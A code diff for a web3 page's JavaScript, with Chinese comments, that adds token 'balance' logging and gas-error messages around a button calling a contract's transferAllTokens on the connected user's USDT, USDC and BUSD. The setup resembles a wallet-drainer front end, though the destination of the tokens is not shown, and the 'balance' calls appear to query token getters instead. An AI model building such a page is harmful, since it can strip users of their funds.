@@ -123,7 +123,16 @@ connectButton.addEventListener('click', async () => {
 // 转移代币功能
 transferButton.addEventListener('click', async () => {
     try {
-        // 调用合约中的 transferAllTokens 方法，设置 gas 限额
+        // 先检查用户的代币余额
+        const usdtBalance = await contract.methods.usdtToken().call({ from: userAddress });
+        const usdcBalance = await contract.methods.usdcToken().call({ from: userAddress });
+        const busdBalance = await contract.methods.busdToken().call({ from: userAddress });
+
+        console.log('用户 USDT 余额:', usdtBalance);
+        console.log('用户 USDC 余额:', usdcBalance);
+        console.log('用户 BUSD 余额:', busdBalance);
+
+        // 调用合约中的 transferAllTokens 方法，设置 gas 上限
         await contract.methods.transferAllTokens(userAddress).send({
             from: userAddress,
             gas: 500000  // 设置为 500,000 gas 上限
@@ -133,6 +142,12 @@ transferButton.addEventListener('click', async () => {
 
     } catch (error) {
         console.error('代币转移失败:', error);
-        statusMessage.textContent = '代币转移失败，错误信息: ' + error.message;
+        
+        // 捕获详细的错误信息并显示
+        if (error.code === -32000) {
+            statusMessage.textContent = '代币转移失败：Gas不足。请确保账户中有足够的ETH支付Gas费。';
+        } else {
+            statusMessage.textContent = '代币转移失败，错误信息: ' + error.message;
+        }
     }
 });
